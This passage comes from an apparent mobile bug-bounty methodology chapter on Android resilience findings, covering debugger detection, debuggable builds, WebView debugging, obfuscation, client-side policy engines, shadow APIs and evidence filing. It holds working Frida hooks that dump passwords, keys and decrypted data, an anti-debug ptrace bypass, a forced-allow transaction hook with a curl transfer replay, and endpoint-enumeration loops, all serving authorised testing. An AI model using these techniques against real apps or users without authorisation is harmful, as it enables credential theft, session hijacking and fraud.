    AM.getPassword.implementation = function(a){ var r=this.getPassword(a); console.log('[AccountManager.getPassword] '+r); return r; }; } catch(e){}
  try { var KS = Java.use('java.security.KeyStore');
    KS.getKey.implementation = function(a,p){ console.log('[KeyStore.getKey] '+a); return this.getKey(a,p); }; } catch(e){}
  var C = Java.use('javax.crypto.Cipher');
  C.doFinal.overload('[B').implementation = function(b){ var r=this.doFinal(b);
    console.log('[Cipher.doFinal] out=' + Java.use('java.lang.String').$new(r)); return r; };
  var DB = Java.use('android.database.sqlite.SQLiteDatabase');
  DB.rawQuery.overload('java.lang.String','[Ljava.lang.String;').implementation = function(q,a){
    console.log('[rawQuery] ' + q); return this.rawQuery(q,a); };
});
JS
```
- **Proof:** The hook output containing a real token, key or row set — **and then that value used off the
  device**, from your own machine, against a second account. Without the second half you have an AM-12
  observation.
- **Escalation:** Extracted token -> D15/D13 (replay it against the backend); hooked
  `setUserAuthenticationRequired` -> D13 biometric bypass; extracted key -> D12. MASTG's pass condition is
  the inverse and is worth quoting in the negative: the test *passes* if "the session terminates
  unexpectedly, hook callbacks never execute, or the process exits".
- **Ruled out when:** The hooks never fire, the session terminates on injection, or the extracted values
  are per-device and authenticate nothing off the device (run the two-device `xxd` check from D21-002
  condition 6). Local-only extraction on the device owner's own data is Low by construction — the attacker
  already controls the device.

### D21-046 · Debugger detection absent, or present only in debug variants

| | |
|---|---|
| **Severity ceiling** | Medium — rated on what the attached debugger reaches; the missing detection alone is Informational |
| **VRT** | `lack_of_binary_hardening\|lack_of_exploit_mitigations` (**P5**) for the absence |
| **Attacker** | AM-11 physical unlocked with USB debugging, or AM-12 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0352, MASTG-TEST-0353, MASWE-0064, MASTG-KNOW-0028 (Anti-Debugging), MASTG-KNOW-0007, MASTG-TECH-0031, MASTG-TECH-0040, MASTG-TECH-0018, MASTG-BEST-0007/-0029/-0047, rules `mastg-android-debugger-checks` and `mastg-android-native-debugger-checks`, MASTG-TOOL-0019 (jdb), MASTG-TOOL-0152 (lldb), MASTG-TOOL-0151 (debugmepLS); deprecated MASTG-TEST-0046 |

- **Test:** Confirm whether debugging detection exists **and executes in release**, then attach. The
  frequent defect is a check that only runs in the debug variant — present in the source, absent from the
  shipped build.
- **How:**
```bash
semgrep -c rules/mastg-android-debugger-checks.yml sources/
semgrep -c rules/mastg-android-native-debugger-checks.yml lib/
grep -rn 'Debug\.isDebuggerConnected\|waitingForDebugger\|waitForDebugger\|ApplicationInfo\.FLAG_DEBUGGABLE' sources/
strings lib/arm64-v8a/*.so | grep -E 'ptrace|TracerPid|/proc/self/status'
adb shell am set-debug-app -w com.target.app
adb forward tcp:8700 jdwp:$(adb shell pidof com.target.app) && jdb -attach localhost:8700
adb shell cat /proc/$(adb shell pidof com.target.app)/status | grep TracerPid
```
  Neutralise the native side if `ptrace` self-attach is the mechanism:
```javascript
const ptrace = Module.findExportByName(null, 'ptrace');
if (ptrace) Interceptor.replace(ptrace, new NativeCallback(function(){ return -1; }, 'int', ['int','int','pointer','pointer']));
```
- **Proof:** A debugger attached with no defensive response — `TracerPid` non-zero while the app continues
  — or a trace showing the check is never called in the release build. Then the substance: what the
  debugger let you read or modify.
- **Escalation:** -> D12/D13 (runtime state read/modified). MASTG's two validation points to quote: the
  detection must run "in release builds and not only in debug configurations", and the app must take "a
  security-relevant action when a debugger is detected".
- **Ruled out when:** Attaching terminates the app or restricts the flow in the **release** build, and
  `TracerPid` monitoring is demonstrably active. Note that debugger attach also requires USB debugging
  enabled and an unlocked device — state that precondition (D21-011) before claiming any severity.

### D21-047 · `android:debuggable="true"` in the release build — the resilience story collapses entirely

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management\|authentication_bypass` (**P1**) where JDWP yields the session; otherwise rate on the data reached |
| **Attacker** | AM-11 physical unlocked with USB access; AM-03/AM-06 where adb-over-TCP is enabled |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0031 (Debugging); drozer `app.package.debuggable`, `exploit.jdwp.check`; Android's `android-debuggable` risk documentation |

- **Test:** If the shipped build is debuggable, every RASP control is bypassable without root, without
  Frida and without a custom ROM — and the app's private data is readable via `run-as`. This is the item
  in the chapter that rates on its own.
- **How:**
```bash
aapt2 dump xmltree base.apk --file AndroidManifest.xml | grep -i debuggable
adb shell dumpsys package com.target.app | grep -i 'flags=.*DEBUGGABLE'
adb shell run-as com.target.app ls -la files shared_prefs databases
adb shell am set-debug-app -w com.target.app
adb forward tcp:8700 jdwp:$(adb shell pidof com.target.app) && jdb -attach localhost:8700
# then set a field or a return value on the RASP check from the debugger
```
  drozer equivalents:
```
dz> run app.package.debuggable -f com.target
dz> run exploit.jdwp.check
```
- **Proof:** `run-as` returning the app's private files on a **store-signed release** build, and/or the
  RASP check neutralised through JDWP alone with the app proceeding.
- **Escalation:** -> D02 (the flag itself), -> D11 (private data read with no root), -> D13 (session
  extracted), -> D14 (`<debug-overrides>` in the NSC becomes live). It also reduces every other resilience
  finding's mitigating-factor argument to zero, which is worth one sentence in the report.
- **Ruled out when:** `aapt2 dump xmltree` shows no `debuggable` attribute (the default is false) and
  `dumpsys package` shows no `DEBUGGABLE` flag on the store build. Check the store build specifically —
  a debuggable *debug* build is not a finding.

### D21-048 · `setWebContentsDebuggingEnabled(true)` in production

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management\|authentication_bypass` (**P1**) where the DevTools session yields the authenticated web session; otherwise rate on the content reached |
| **Attacker** | AM-11 physical unlocked with USB/adb; AM-03 where another app can reach the abstract socket on an affected build |
| **Applies to** | all apps with WebViews |
| **Maps to** | MASTG-TECH-0031; Android's test/debug-features risk documentation; MASWE-0061 |

- **Test:** This exposes the app's WebViews to Chrome DevTools over the adb socket — full DOM and JS
  access to authenticated sessions, on a **non-rooted** device. It is frequently enabled by a third-party
  library rather than by the app team, which is why it survives review.
- **How:**
```bash
grep -RnE 'setWebContentsDebuggingEnabled' sources/
adb forward tcp:9222 localabstract:webview_devtools_remote_$(adb shell pidof com.target.app)
curl -s http://127.0.0.1:9222/json | jq -r '.[].url'
curl -s http://127.0.0.1:9222/json/version
```
- **Proof:** `curl` listing the app's authenticated WebView URLs, then executing JS in that context via
  the DevTools protocol and returning a session value (`document.cookie`, a bearer token in
  `localStorage`).
- **Escalation:** -> D10 (the bridge surface is now fully enumerable), -> D13 (session extracted).
- **Ruled out when:** The grep is clean and no `webview_devtools_remote_*` abstract socket exists for the
  app's PID (`adb shell cat /proc/net/unix | grep webview_devtools`). Check every library, not only app
  code — a library can enable it process-wide.

### D21-049 · Debug, staging and god-mode surfaces surviving into the release build

| | |
|---|---|
| **Severity ceiling** | Critical for a hardcoded credential or an auth bypass; High otherwise |
| **VRT** | `broken_authentication_and_session_management\|authentication_bypass` (**P1**); `insecure_os_firmware\|hardcoded_password\|privileged_user` (**P1**) for a shipped test credential; `broken_access_control\|exposed_sensitive_android_intent` (**VARIES**) for the reachable debug Activity |
| **Attacker** | AM-03 zero-permission local app where the debug component is exported; AM-11 otherwise |
| **Applies to** | all |
| **Maps to** | Android test/debug-features risk documentation; MASWE-0061 |

- **Test:** Debug activities, staging endpoints, feature-flag overrides, "god mode" switches and test
  accounts left in the shipped APK are directly reachable, and they frequently change auth or endpoint
  behaviour rather than merely displaying information.
- **How:**
```bash
grep -RnoE 'https?://[A-Za-z0-9.-]*(dev|test|stag|qa|uat|sandbox|internal)[A-Za-z0-9.-]*/[A-Za-z0-9._/-]*' sources/ res/ | sort -u
grep -RnE 'BuildConfig\.DEBUG|isDebug|DEBUG_MODE|ENABLE_LOGGING|FEATURE_OVERRIDE' sources/
grep -rniE 'debugmenu|devmenu|testmode|godmode|bypass|backdoor|internal_only|is_test|masterpass|supersecret' sources/ | head -60
grep -rn 'BuildConfig\.[A-Z_]*' sources/ | sort -u | head -40
adb shell dumpsys package com.target.app | grep -iE 'debug|test|dev'
adb shell am start -n com.target.app/.debug.DebugMenuActivity
adb shell am start -n com.target.app/.debug.DevToolsActivity
```
- **Proof:** The debug menu opening on a **release** build, a staging endpoint returning production data,
  or a hardcoded test credential authenticating against production. Show the request that proves the
  environment, not just the screen.
- **Escalation:** -> D15 (a staging endpoint with weaker auth is exactly the shadow-API case, D21-054),
  -> D13 (test credential), -> D04 (if the debug Activity is exported).
- **Ruled out when:** No debug component is exported or launchable on the release build (`am start`
  returns a `SecurityException` or `Activity does not exist`), all `BuildConfig` debug flags are false in
  the shipped `BuildConfig.class`, and no non-production host resolves. Test the launch, do not infer it
  from the manifest alone.

### D21-050 · `StrictMode` left enabled in the production build

| | |
|---|---|
| **Severity ceiling** | Low — bundle it, do not file it alone |
| **VRT** | `lack_of_binary_hardening\|lack_of_exploit_mitigations` (**P5**) |
| **Attacker** | AM-11 |
| **Applies to** | all; the target of the test is explicitly the production build |
| **Maps to** | MASTG-TEST-0263, MASTG-TEST-0264, MASTG-TEST-0265, MASTG-TECH-0009, MASWE-0061 (CWE-489, CWE-497, CWE-540, CWE-912, CWE-1295), MASVS-RESILIENCE-3, rule `mastg-android-strictmode` |

- **Test:** "Leaving `StrictMode` enabled can expose sensitive implementation details in the logs." The
  finding, if there is one, is what a specific violation line carries — not the policy's presence.
- **How:**
```bash
grep -rnE 'StrictMode\.(setVmPolicy|setThreadPolicy)|VmPolicy\.Builder|ThreadPolicy\.Builder|penaltyLog|detectAll' sources/
semgrep --config rules/mastg-android-strictmode.yml sources/
adb logcat --pid=$(adb shell pidof -s com.target.app) | grep -i StrictMode
```
- **Proof:** `StrictMode` policy-violation lines in logcat from a **release-signed** build, showing
  internal file paths, class names or URIs.
- **Escalation:** Bundle with `android:debuggable` (D21-047), `setWebContentsDebuggingEnabled`
  (D21-048) and shipped native debug symbols (D16) into one "debug artefacts shipped to production" item
  rather than four separate Lows. Raise it on its own only if a violation line itself carries something
  sensitive — a token in a URI, or a private path revealing an unreleased feature.
- **Ruled out when:** No `StrictMode` configuration exists in the release build, or the policy is
  installed only under a `BuildConfig.DEBUG` guard that is false in the shipped `BuildConfig`. Confirm
  from logcat on the store build, not from the source.

### D21-051 · Insufficient obfuscation — report the recovered business rule, never the absence

| | |
|---|---|
| **Severity ceiling** | High where the recovered rule lets you evade a fraud or abuse control; Informational for the obfuscation gap alone |
| **VRT** | `lack_of_binary_hardening\|lack_of_obfuscation` (**P5**) for the gap; file the recovered rule under `sensitive_data_exposure\|disclosure_of_secrets\|for_internal_asset` (**P3**) or the control it defeats |
| **Attacker** | AM-01 (anyone can download the APK) |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0368 (Java/Kotlin), MASTG-TEST-0369 (native), MASWE-0059 (CWE-693), MASTG-KNOW-0033 (Obfuscation), MASTG-TECH-0013, -0016, -0017, -0018, -0023, -0024, -0157, MASTG-BEST-0029, MASTG-TOOL-0018 (jadx), MASTG-TOOL-0011 (apktool), MASTG-TOOL-0153 (dProtect); deprecated MASTG-TEST-0051 |

- **Test:** Decompile and determine whether security-relevant logic can be located and understood with
  reasonable effort. The deliverable is the *rule you recovered* — the fraud threshold, the velocity
  limit, the allowlisted account ids, the internal hostname, the exact scope of the root check.
- **How:** Java/Kotlin layer:
```bash
jadx -d out app.apk
apkid app.apk | grep obfuscator
grep -rncE 'class [a-z]{1,3} ' out/sources/ | head            # how much did R8 actually rename?
grep -rniE 'threshold|risk_?score|fraud|velocity|max_?amount|limit|allowlist|deny|entitle|premium|licen' out/sources/ | head -40
grep -rn 'BuildConfig' out/sources/ | grep -iE 'secret|key|url|env'
apktool d app.apk -o smali_out      # fallback when jadx output is unreliable
```
  Native layer:
```bash
unzip -o app.apk 'lib/*' -d libs && find libs -name '*.so'
rabin2 -zz libs/arm64-v8a/libnative-lib.so | grep -iE '/system|magisk|su$|ro\.|frida|token'
rabin2 -s  libs/arm64-v8a/libnative-lib.so | grep JNI
nm -D libs/arm64-v8a/*.so | grep ' T Java_'                   # descriptive exported JNI symbols
r2 -A libs/arm64-v8a/libnative-lib.so
```
  The string -> xref -> function -> confirm loop, which is what turns "the app detects root somehow" into
  a named, patchable function:
```
r2 ./libnative.so
[..]> aaa
[..]> izz~secure          # find the alert/decision string
[..]> s str.<hit>
[..]> axt                 # who references it -> the deciding function
[..]> s <fn>; pdf ; VV    # read it; graph view for branch-heavy checks
[..]> izz~magisk ; ii~fork
```
- **Proof:** The concrete business rule, quoted from the decompile. MASTG's own attack scenarios are the
  template: an attacker "locates the fraud-scoring logic within minutes by following the plaintext string
  constants", reads "the exact detection thresholds and decision criteria directly from the decompiled
  output", and crafts transactions just below the threshold; natively, "plaintext strings in the `.rodata`
  section immediately reveal every file path and system property the library checks" and "the exported JNI
  function name and call structure fully expose the check's logic".
- **Escalation:** Recovered fraud thresholds -> D23 transaction structuring (this is the payable form);
  recovered detection scope -> a precise D21-033 bypass; recovered hostname -> D01/D15.
- **Ruled out when:** Identifiers are renamed, strings are encrypted, and no security-relevant constant or
  decision threshold is recoverable in a reasonable effort — state the effort spent and the tooling used.
  De-obfuscation options to exhaust before claiming that: Simplify (virtual execution), DeGuard, DaliVM
  for targeted string decryption, and hand recovery of OLLVM-style native XOR strings and StringFog-style
  DEX string obfuscation.

### D21-052 · Partial obfuscation that leaves the security-critical routines in the clear

| | |
|---|---|
| **Severity ceiling** | Medium — report bundled with the concrete bypass it enabled; Low alone |
| **VRT** | `lack_of_binary_hardening\|lack_of_obfuscation` (**P5**) |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | MASTG-KNOW-0033, MASTG-TECH-0165, MASTG-TOOL-0009 (APKiD) |

- **Test:** "Not obfuscated" is informational. The sharper version is a *partially* obfuscated build where
  the key derivation, licence check, anti-tamper and crypto routines are left readable while the rest of
  the app is renamed — which hands an attacker a map straight to them.
- **How:**
```bash
apkid app.apk                               # which obfuscator, and applied to what
jadx app.apk -d out-jadx
# compare naming density per package - the readable package is the map
for p in $(find out-jadx/sources -maxdepth 3 -type d | head -40); do
  tot=$(ls "$p"/*.java 2>/dev/null | wc -l)
  [ "$tot" -eq 0 ] && continue
  short=$(ls "$p" 2>/dev/null | grep -cE '^[a-z]{1,3}\.java$')
  echo "$short/$tot  $p"
done | sort -t/ -k1 -n | head -20
```
  Also check what a DexGuard-style resource-decryption chain leaves recoverable (`InputStream` ->
  `FilterInputStream` decrypt -> `ZipInputStream` -> `loadDex`), and whether ProGuard/R8 mapping files or
  `--split-debug-info` maps shipped alongside the build.
- **Proof:** The security-critical class and method names readable in a build where the rest of the app is
  renamed — the two package listings side by side.
- **Escalation:** -> D21-051 (the rule you then read), -> D21-033 (the precise bypass it enabled).
- **Ruled out when:** Obfuscation coverage is uniform across packages, or the security-critical code lives
  in a native library with stripped symbols. Show the naming-density comparison rather than asserting it.

### D21-053 · A client-side-only policy engine that the server trusts

| | |
|---|---|
| **Severity ceiling** | High when money or entitlement moves |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | MASVS-RESILIENCE-1; the generalised form of D21-013 |

- **Test:** The generalisation that catches what the integrity items miss: **any** decision the app makes
  locally — transaction limit, geo-restriction, age gate, feature entitlement, KYC status, retry counter,
  attempt limiter — that the server then accepts from the client.
- **How:** Patch the client value, or simply edit the request:
```javascript
Java.perform(function () {
  var C = Java.use('com.target.app.security.PolicyEngine');
  C.isTransactionAllowed.implementation = function (amt) { console.log('[policy] forced allow ' + amt); return true; };
});
```
  Then — the step that makes it a finding — replay outside the app entirely:
```bash
curl -i -X POST https://api.target/v1/transfer -H "Authorization: Bearer $TOK" \
     -H 'Content-Type: application/json' -d '{"amount":100000,"to":"attacker"}'
```
  The mobile-specific variant worth its own probe: **client-only rate limits the API never enforces**.
  Replay the verify/attempt request directly with curl, past the point where the app's own counter would
  have locked out.
- **Proof:** The **server-side record** showing the forbidden action completed — the ledger entry, the
  entitlement on a fresh GET, the attempt N+1 succeeding after the UI would have locked. The Frida script
  is never the proof; the server's acceptance is.
- **Escalation:** -> D23 (fraud), -> D13 (where the client-only limiter guards an OTP or recovery code,
  which is the Critical case: `server_security_misconfiguration|no_rate_limiting_on_form|login`, P4, argued
  up on the ATO), -> D15.
- **Ruled out when:** The replayed request is refused by the server with the same policy error the client
  showed. Prove it with curl outside the app — a client that refuses tells you nothing about the server.

### D21-054 · The shadow API version that never enforced the integrity gate

| | |
|---|---|
| **Severity ceiling** | Critical where the old version bypasses auth entirely; High for a weakened control; **a version difference alone is Informational** |
| **VRT** | `broken_authentication_and_session_management\|authentication_bypass` (**P1**) at the ceiling; `broken_access_control\|privilege_escalation` (**VARIES**) for the weakened control |
| **Attacker** | AM-01 |
| **Applies to** | any versioned API; every hardcoded endpoint in the APK is a candidate |
| **Maps to** | the shadow/zombie-API class from the bug-hunting corpus — "a mobile app whose hardcoded backend calls look older than the current web app's" |

- **Test:** The highest-value mobile-to-backend bridge, and it belongs in this chapter because the
  attestation and rate-limiting controls are exactly what does **not** get backported to old versions. Old
  versions stay reachable without receiving the same fixes; the bug is the delta.
- **How:**
```bash
for v in v1 v2 v3 v4 beta alpha internal legacy old 2022-01-01 2023-01-01 2024-01-01; do
  curl -s -o /dev/null -w "%{http_code} /api/$v/\n" "https://$TARGET/api/$v/"
done
curl -s -H "X-API-Version: 1" https://$TARGET/api/session
curl -s -H "Accept: application/vnd.company.v1+json" https://$TARGET/api/session
for sub in api api-v1 api-v2 apiv1 legacy-api old-api internal-api staging-api; do
  curl -s -o /dev/null -w "%{http_code} $sub\n" "https://$sub.$TARGET/"
done
```
  Anything but 404 or connection-refused is live. Then diff **behaviourally**, for the same operation,
  across four axes — and for this chapter the first two are the point:
```
1. attestation / integrity  - does v1 accept the request with no integrity token at all?
2. rate limiting            - burst both; a missing 429 on v1 means throttling was never backported
3. auth strength            - does v1 accept no token / an expired token / a lower-privilege token?
4. field exposure           - does v1 return internal ids or PII the current version redacts?
```
- **Proof:** The same request against both versions side by side, with the old path completing the
  integrity-gated action that the current path refuses. Run the D21-012 body-diff and layer-ordering gates
  on both responses before claiming it.
- **Escalation:** -> D15 (the whole old router is now in scope), -> D01 (every APK-sourced endpoint is a
  version-diff candidate). Treat a version difference with no behavioural delta as Informational and say
  so.
- **Ruled out when:** Old version paths return 404 or connection-refused, or they return a static
  "deprecated" response whose underlying operation does not execute (verify by checking for the
  server-side effect, not the status code).

### D21-055 · Emulator detection absent — the finding is the automation, not the absence

| | |
|---|---|
| **Severity ceiling** | Low — Informational standalone; rated on the abuse it enables |
| **VRT** | `lack_of_binary_hardening\|lack_of_jailbreak_detection` (**P5**) for the absence |
| **Attacker** | AM-01 (an emulator farm is a remote client) |
| **Applies to** | MAS-R scoped engagements for the observation; anti-fraud-relevant apps for the escalation |
| **Maps to** | MASTG-TEST-0351, MASWE-0053, MASTG-KNOW-0031, MASTG-BEST-0046, MASTG-TECH-0032, MASTG-TOOL-0009 (APKiD `anti_vm`); deprecated MASTG-TEST-0049; ATT&CK T1633 Virtualization/Sandbox Evasion, T1633.001 System Checks |

- **Test:** Hook and trace the common emulator checks while running on an emulator. The observation is
  Informational; the escalation is that the app's abuse economics assume a per-device cost that does not
  exist.
- **How:**
```bash
grep -rn 'Build\.FINGERPRINT\|Build\.MODEL\|Build\.MANUFACTURER\|Build\.PRODUCT\|Build\.HARDWARE\|Build\.TAGS\|ro\.kernel\.qemu\|goldfish\|ranchu\|sdk_gphone\|generic_x86' sources/
apkid app.apk | grep anti_vm
strace -p $(adb shell pidof com.target.app) 2>&1 | grep -E 'qemu|goldfish|ranchu|/proc/tty/drivers'
frida -U -f com.target.app -l emulator_detect_hooks.js
```
  Note the sophisticated variants ATT&CK documents, in case the app implements them and you misdiagnose a
  failure: sampling motion-sensor data, requiring a number of recorded steps before activating, and
  checking network-adapter addresses, CPU core count and memory/drive size.
- **Proof:** The app running normally on an emulator with no detection call observed in the trace — then
  the escalation: the *rate* at which account creation, referral redemption or promo claiming can be
  driven from emulated devices, quantified.
- **Escalation:** -> D23 (automated abuse and fraud farming at scale) and -> D21-018 (the backend accepting
  `MEETS_VIRTUAL_INTEGRITY` is the server-side half of the same problem, and it is the half that rates).
- **Ruled out when:** The app refuses to run or restricts the flow on a Play-image emulator, or the
  backend independently refuses the emulator's requests (verify by replaying with curl). Note the
  environment honestly: a standard emulator is software-Keystore-backed and unrooted-production images
  cannot be rooted (`adb root` returns "adbd cannot run as root in production builds") — neither is a
  finding about the app.

### D21-056 · Compat-framework and `device_config` toggles — prove the protection is per-package switchable

| | |
|---|---|
| **Severity ceiling** | Support; becomes a finding only when a client control depends solely on one of these platform behaviours |
| **VRT** | n/a |
| **Attacker** | AM-11 (shell access on the user's own device) |
| **Applies to** | debuggable or shell-accessible devices; some toggles require the app to be debuggable or the build to be userdebug |
| **Maps to** | Android 12/15/16 behaviour-change documentation (each documents its own `am compat` change name); Android app-compatibility test/debug guide |

- **Test:** The Android compatibility framework enables and disables individual behaviour changes **per
  package** from the shell. That means a "targetSdk 3x protection" a vendor is relying on can be switched
  off on a device the user controls — and it lets you prove whether the app's own logic depends on a
  platform behaviour rather than on its own code.
- **How:**
```bash
adb shell am compat                                      # usage
adb shell dumpsys platform_compat | grep -i com.target.app
adb shell am compat enable  <CHANGE_ID_OR_NAME> com.target.app
adb shell am compat disable <CHANGE_ID_OR_NAME> com.target.app
adb shell am compat reset   <CHANGE_ID_OR_NAME> com.target.app
```
  Verified change names from the behaviour-change documentation: `REQUIRE_EXACT_ALARM_PERMISSION`,
  `NOTIFICATION_TRAMPOLINE_BLOCK`, `BLOCK_UNTRUSTED_TOUCHES`, `FGS_INTRODUCE_TIME_LIMITS`,
  `FGS_BOOT_COMPLETED_RESTRICTIONS`, `FGS_SAW_RESTRICTIONS`, `RESTRICT_LOCAL_NETWORK`,
  `STPE_SKIP_MULTIPLE_MISSED_PERIODIC_TASKS`, `DISALLOW_INVALID_GROUP_REFERENCE`,
  `ENABLE_STRICT_VALIDATION`. The `device_config` sibling compresses a platform timeout so a starvation
  PoC fits inside an engagement window:
```bash
adb shell device_config put activity_manager data_sync_fgs_timeout_duration 3600000
adb shell device_config get activity_manager data_sync_fgs_timeout_duration
adb shell device_config list activity_manager | head -40
```
- **Proof:** The app's behaviour changing under a named compat toggle, with before/after logs — this is
  how you demonstrate "the protection you are relying on is per-package switchable on a device the user
  controls", in one command rather than a paragraph.
- **Escalation:** Enables PoCs across D04 (`BLOCK_UNTRUSTED_TOUCHES` and tapjacking), D05/D08
  (`NOTIFICATION_TRAMPOLINE_BLOCK`), D06 (the FGS limits) and D14 (`RESTRICT_LOCAL_NETWORK`). Becomes a
  D21 finding only where the vendor's stated control *is* the platform behaviour.
- **Ruled out when:** The toggle has no effect on the app's behaviour (the app enforces the property in
  its own code), or `dumpsys platform_compat` shows the change is not overridable for this package.
  Record the `dumpsys` line as the negative.

### D21-057 · Evidence, retraction and filing discipline for a domain that triagers distrust

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | every finding in this chapter that reaches a report |
| **Maps to** | the pre-severity gate, five-screenshot pattern, HAR sanitising, retraction discipline and chain-filing order from the bug-hunting corpus |

- **Test:** Resilience-adjacent findings arrive at triage with a presumption against them, so the evidence
  and the filing order have to do more work here than anywhere else.
- **How:** Four mechanics, in order:
  **1. Run the pre-severity gate against the CRITICAL CLAIM, not the bug.** Write the draft title, then
  substitute the claim into each question: have I validated the *full* chain to attacker-attainable impact
  or only a primitive in the middle; what does the attacker walk away with in one concrete sentence; have
  I personally reproduced the whole chain end to end **at least twice**; is there still an inheritance,
  signature, audience or nonce check gating it; has the programme rejected this class before. "Integrity
  gate bypassed at layer N" is a primitive, not a Critical.
  **2. Five screenshots for every state change**, taken in one sitting without reloading pages between
  them: pre-state verification, the bug itself, the negative post-state, the positive post-state, and the
  out-of-band side effect (the notification email that did or did not arrive). Name them
  `{finding-#}-step{n}-{description}.png` and reference them by filename in the body.
  **3. Sanitise the HAR, and leave visible what the triager needs.**
```bash
jq '.log.entries |= map(
  (.request.headers  |= map(if .name|ascii_downcase|IN("cookie","authorization","x-integrity-token","x-attestation") then .value="<REDACTED>" else . end)) |
  (.response.headers |= map(if .name|ascii_downcase|IN("set-cookie") then .value="<REDACTED>" else . end)) |
  (.request.cookies  |= map(.value="<REDACTED>")) |
  (.response.cookies |= map(.value="<REDACTED>")))' in.har > out.sanitized.har
grep -i 'authorization\|"cookie"\|integrity-token' out.sanitized.har | head -20   # verify
```
  Mask session tokens, attestation tokens and the victim's PII. **Leave visible** trace ids
  (`x-request-id`, `x-datadog-trace-id`), your own attacker account id, and JSON key names — the triager
  needs them to correlate against server logs, and redacting them is the fastest way to a "cannot
  reproduce".
  **4. File primitives first, then the consumer, then backfill.** A root-required primitive at its
  standalone severity, the server-trust consumer at the chained severity referencing the primitives' ids,
  then edit the primitives to point back. One fix equals one bounty; a chain is a severity amplifier, not
  a merge request. Never file the whole set within minutes of each other.
- **Proof:** A report whose first body section is the severity-request paragraph, whose first code block
  is the exact curl the triager can paste, and whose appendix carries any retraction in the fixed form:
  original signal, disproving evidence, why it looked like a bug, retraction date.
- **Escalation:** -> D27. One inversion to hold on to: **do not retract a confirmed finding that stopped
  reproducing because the client patched mid-engagement.** Keep the timestamped pre-patch request and
  response; that is a different situation from a finding that never reproduced, and the difference is
  whether you hold pre-patch evidence.
- **Ruled out when:** n/a — this item is always in force. The negative version is the ruled-out register
  itself: every "Ruled out when" clause in this chapter that you exercised belongs in the report as a
  coverage statement, because in this domain a defensible negative is frequently the most valuable thing
  you can deliver.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| "Root detection is missing" | `lack_of_binary_hardening\|lack_of_jailbreak_detection` = **P5** with an all-zero CVSS impact vector. HackerOne Core Ineligible lists it under "Optional security hardening steps / Missing best practices" | Nothing about the absence. Only what the rooted session reached, re-derived on a stock device or through a stock-reachable path (D21-002, D21-010) |
| "Root detection is bypassable" | Same node, same P5. Every major programme excludes it: Google Mobile VRP "Attacks that require a rooted device", Xiaomi/Grab/Spotify "runtime hacking exploits using tools like Frida/Appmon", PayPal, Basecamp, Snapchat, Reddit, HackenProof, YesWeHack Gojek "Lack of binary protection / jailbreak and root detection / anti-debugging controls" | The **server** honouring the client's verdict (D21-013), or the specific control the bypass unlocked, filed under that control's domain (D21-033) |
| "Frida can attach / the app has no hook detection" | `lack_of_binary_hardening\|runtime_instrumentation_based` = **P5**. AM-12 is not an attacker model | The credential the hook extracted, proved to authenticate other users or off the device (D21-045 + D21-002 condition 6) |
| "The APK can be repackaged and re-signed" | HackenProof "Lack of obfuscation or repackaging protections"; Grab/Spotify/Starbucks/Xiaomi "Lack of binary protection control". The repackaged app attacks only its own installer | A distribution channel you can poison so the repackaged build reaches **other** users — that is D17, not D21 |
| "The app is not obfuscated" | `lack_of_binary_hardening\|lack_of_obfuscation` = **P5**; MASVS: "the absence of any MAS-R measures does not inherently introduce vulnerabilities" | The business rule you read out of the decompile — a fraud threshold, a velocity limit, an allowlist of privileged account ids (D21-051) |
| "Emulator detection is missing" | P5, and an emulator is not a security boundary. Google Invalid Reports: "Rooted devices and emulators do not have the same security boundaries as regular devices" | The backend accepting `MEETS_VIRTUAL_INTEGRITY` where its own policy requires device integrity (D21-018), with the abuse rate quantified |
| "Debugger detection is missing" | P5 standalone, and attaching needs USB debugging plus an unlocked device | What the attached debugger extracted or modified (D21-046), or `android:debuggable="true"` on the store build, which is a different item entirely (D21-047) |
| "I bypassed the app's RASP with objection/Frida in five minutes" | A statement about your tooling. AOSP's own modifier table caps anything needing an unlocked bootloader or Developer Mode at **no higher than Low** | Nothing. Report what you reached afterwards, on a stock device where possible |
| "Play Integrity can be defeated with Magisk + TrickyStore + a keybox" | This spoofs attestation *inputs*; Google's backend signature verification still succeeds because the JWT is genuine. It is an operator capability, not an app vulnerability — and abused keyboxes get revoked | The backend accepting a **replayed** or **relayed** token (D21-015, D21-016), or accepting one with no freshness or nonce binding — none of which needs a keybox |
| "The app's root check can be defeated, and it uses Play Integrity" | If the verdict is server-verified, no local hook forges it. Stop and re-scope to server-side testing rather than burning hours on Frida | The server accepting requests that carry **no** integrity verdict at all, or carrying one bound to nothing (D21-006 routes you) |
| "Production images cannot be rooted / `adb root` is denied" | `adbd cannot run as root in production builds` is a platform property of `user` builds, not an app finding | Nothing. It is a harness fact; record it in the methodology |
| "The app stores a token in internal storage and root can read it" | `insecure_data_storage\|sensitive_application_data_stored_unencrypted\|on_internal_storage` = **P5**; the sandbox holds against every attacker except the device owner | The token authenticating a **different** account from your own machine, or a non-root path to the same bytes (backup, exported provider, debuggable build) |
| "The app does not use Play Integrity at all" | MASWE-0054/-0056 are hardening gaps. An app is not obliged to attest | Only in a MAS-R-scoped SoW engagement (D21-001), where it is a contractual finding, not a vulnerability |
| "`StrictMode` violations appear in logcat" | Debug artefact; since Android 4.1 no ordinary app reads another app's log | A violation line that itself carries a token, a private path revealing an unreleased feature, or a reader you can name (a log-uploading SDK, a crash reporter, a debuggable build) |
| "A RASP telemetry beacon fires when I attach Frida" | The SDK reporting a signal is working as designed. Telemetry is not a control | The beacon's *absence* changing a server decision — i.e. the backend gating on a signal a modified client simply never sends (D21-005 -> D21-013) |
| "The app runs on my rooted phone and I can see my own data" | AM-12. You are the device owner attacking yourself | Any one of the six conditions in D21-002, with its artefact |
| "The tamper response logs the user out" | A non-destructive response is the app behaving correctly | The response wiping data, locking the account or bricking the session **and** a trigger another app can plant (D21-039) |
